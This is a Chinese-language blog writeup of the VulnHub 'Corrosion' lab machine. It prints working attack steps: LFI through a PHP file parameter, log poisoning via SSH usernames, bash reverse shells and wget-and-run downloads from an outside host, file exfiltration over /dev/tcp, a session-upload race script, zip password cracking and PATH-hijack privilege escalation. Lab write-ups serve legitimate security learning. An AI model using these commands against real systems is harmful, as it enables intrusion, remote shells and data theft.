---
title: Corrosion (VulnHub Writeup)
date: 2021-08-14T23:19:00+08:00
draft: false
url: "/2021/08/14/corrosion-vulnhub-writeup/"
categories:
  - VulnHub
showToc: true
TocOpen: false
---

> 
URL : https://www.vulnhub.com/entry/corrosion-1,730/

IP : 35.229.145.176

## Recon

- 掃 Port`rustscan -a 35.229.145.176 -r 1-65535`![](/uploads/2022/02/a528d-Wo4QJYS.png)`nmap -A -p80,22 35.229.145.176`- ![](/uploads/2022/02/4a112-5c5j1F1.png)掃路徑- `python3 dirsearch.py -u 35.229.145.176`只掃到 `/tasks/`裡面有一個 todo list
- ![](/uploads/2022/02/2b83a-oOy5dSC.png)換不同的 dict- `python3 dirsearch.py -u http://35.229.145.176/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`掃到 `/blog-post`
- ![](/uploads/2022/02/80755-4sZ5IqG.png)
- http://35.229.145.176/blog-post/繼續掃- `python3 dirsearch.py -u http://35.229.145.176/blog-post/`找到 archives
- ![](/uploads/2022/02/9f4bd-fmPKUZx.png)
- 裡面有一個 php![](/uploads/2022/02/5256f-2iwQc9I.png)

## LFI 2 RCE

- 通靈到可以用 `?file` 來做 LFIhttp://35.229.145.176/blog-post/archives/randylogs.php?file=php://filter/convert.base64-encode/resource=randylogs.php`PD9waHAKICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOwogICBpZihpc3NldCgkZmlsZSkpCiAgIHsKICAgICAgIGluY2x1ZGUoIiRmaWxlIik7CiAgIH0KICAgZWxzZQogICB7CiAgICAgICBpbmNsdWRlKCJpbmRleC5waHAiKTsKICAgfQogICA/Pgo=``php `http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../etc/passwd- ![](/uploads/2022/02/7c3d7-R4eyfsj.png)根據題目提示說 `auth.log` 沒關- http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log![](/uploads/2022/02/533f2-ZZs7AiW.png)`auth.log` 會把 ssh 登入的帳號給紀錄- `ssh 'meow@35.229.145.176'`
- ![](/uploads/2022/02/c4d61-dQTQax3.png)
- ![](/uploads/2022/02/f4096-FORTuYq.png)寫 phpinfo- `ssh '@35.229.145.176'`
- ![](/uploads/2022/02/9ff64-R6Oj5ji.png)
- ![](/uploads/2022/02/61930-h0DYbcB.png)寫 shell- `ssh '@35.229.145.176'`
- ![](/uploads/2022/02/b4a6b-9QroaCb.png)
- `http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log&A=id`
- ![](/uploads/2022/02/5ed17-2yF8Lz0.png)戳 reverse shell- `bash -c 'bash -i >& /dev/tcp/35.201.246.140/7877 0>&1'`
- `wget 35.201.246.140:8000/s`
- http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log&A=wget%2035.201.246.140:8000/s -O /tmp/s
- ![](/uploads/2022/02/de1f9-2xSNqry.png)
- http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log&A=bash /tmp/s
- ![](/uploads/2022/02/f2820-V2XrGag.png)補充，喵策會解法，LFI 無限制 RCE (PHP_SESSION_UPLOAD_PROGRESS)

```
import grequests
sess_name = 'meowmeow'
sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
base_url = 'http://35.229.145.176/blog-post/archives/randylogs.php'
param = "file"

# code = "file_put_contents('/tmp/shell.php','& /dev/tcp/{domain}/{port} 0>&1'");'''

while True:
    req = [grequests.post(base_url,
                          files={'f': "A"*0xffff},
                          data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:"},
                          cookies={'PHPSESSID': sess_name}),
           grequests.get(f"{base_url}?{param}={sess_path}")]

    result = grequests.map(req)
    if "pwned" in result[1].text:
        print(result[1].text)
        break
```

## 進入 Shell

- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- 直接 sudo -l 嘗試提權![](/uploads/2022/02/d14a5-v856hnz.png)
- 需要密碼準備 LinEnum- `wget 35.201.246.140:8000/LinEnum.sh`
- ![](/uploads/2022/02/95ea9-d0rOVig.png)
- ![](/uploads/2022/02/aea06-NyhfvRT.png)找到一個可疑檔案有 SGID- ![](/uploads/2022/02/aa030-NYy5aQ8.png)
- ![](/uploads/2022/02/4e5a4-PjBtD0H.png)
- ![](/uploads/2022/02/da0b7-aLBAm1b.png)傳出可疑檔案分析- 本機 `nc -l -p 1234 > write.ul`
- 靶機 `cat /usr/bin/write.ul > /dev/tcp/35.201.246.140/1234`![](/uploads/2022/02/bdaf1-WoDsBaW.png)用 IDA 觀察- ![](/uploads/2022/02/378c9-HTQsyCy.png)
- 看起來不像是需要逆的東西 QQ
- 再繼續觀察準備 Linpeas- ![](/uploads/2022/02/b04db-xczbBqr.png)
- ![](/uploads/2022/02/1f6f0-Kj5SEXW.png)找到備份檔案- ![](/uploads/2022/02/92b07-6RuyyKX.png)
- 裡面有密碼![](/uploads/2022/02/60477-oGU2Pig.png)傳出來- `cat user_backup.zip > /dev/tcp/35.201.246.140/1234`用約翰爆破 zip- `zip2john user_backup.zip > j`
- `john j --wordlist=/opt/rockyou.txt`![](/uploads/2022/02/39487-lGqxlAl.png)
- 取得密碼為 `!randybaby`解壓縮，取得密碼- ![](/uploads/2022/02/57807-V6uLlD0.png)
- ![](/uploads/2022/02/4bffe-5fcJmBT.png)
- `randylovesgoldfish1998`透過 ssh 登入- 帳號 `randy`
- 密碼 ``randylovesgoldfish1998`取得 userflag- ![](/uploads/2022/02/a1981-mU3HKnB.png)

## 二次提權

- `sudo -l` 起手式![](/uploads/2022/02/a2883-ErcO50H.png)
- 觀察先前壓縮檔中的程式![](/uploads/2022/02/1923c-OkOjUSq.png)
- 因為他是 sudo 所以無法做 path 的汙染QQ觀察檔案權限- ![](/uploads/2022/02/202a6-FTG4wPy.png)
- 發現他有 suid，所以不用sudo就可以用 PATH 汙染 `cat` 了!`echo "bash -c 'bash -i >& /dev/tcp/35.201.246.140/7878 0>&1'" > cat``chmod +x cat``PATH=/home/randy/fakepath:$PATH /home/randy/tools/easysysinfo`收 reverse shell- ![](/uploads/2022/02/362b2-gDvDTRs.png)取得 root flag- ![](/uploads/2022/02/2d044-VArwk2F.png)

## 心得

學到了喵策會的 LFI 大絕招 ； 除了 sudo 外還要在意 SUID，看樣子常常忘東忘西可能要來準備 Check list 了QQ
